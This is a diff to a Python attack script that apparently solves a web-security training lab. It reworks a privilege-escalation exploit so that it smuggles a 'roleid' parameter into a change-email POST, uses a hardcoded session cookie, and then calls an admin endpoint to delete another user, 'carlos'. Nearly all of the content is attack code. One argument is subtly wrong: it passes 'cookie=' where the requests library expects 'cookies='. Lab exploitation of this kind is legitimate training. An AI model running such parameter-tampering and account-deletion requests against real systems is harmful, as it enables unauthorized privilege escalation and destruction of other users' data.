@@ -35,13 +35,27 @@ def login(s, url):
         exit(-1)
 
 
-def set_user_toadmin(s, url):
-    admin_role_path = "/admin-roles?username=wiener&action=upgrade"
+def delete_user(s, url):
+    path = "/admin/delete?username=carlos"
+    r = s.get(url + path, verify=False, proxies=proxies)
+
+    if r.status_code == 200:
+        print("(-> User deleted!")
+    else:
+        print("(-) Couldn't delete user")
+        exit(-1)
+
+
+def change_user_role(s, url):
     login(s, url)
-    r = s.get(url + admin_role_path, verify=False, proxies=proxies)
+    change_email_path = "/my-account/change-email"
+    data = {"email": "wiener@admin-user.org", "roleid": "2"}
+    cookie = {"session": "213109he9fh92hf02h2e"}
+    r = s.post(url + change_email_path, data=data, cookie=cookie, verify=False, proxies=proxies)
 
     if r.status_code == 200:
         print("(-> Successfully changed role from user to admin!!!")
+        delete_user(s, url)
     else:
         print("(-) Couldn't change role")
         exit(-1)
@@ -55,7 +69,7 @@ def main():
 
     url = sys.argv[1]
     s = requests.Session()
-    set_user_toadmin(s, url)
+    change_user_role(s, url)
 
 
 if __name__ == "__main__":
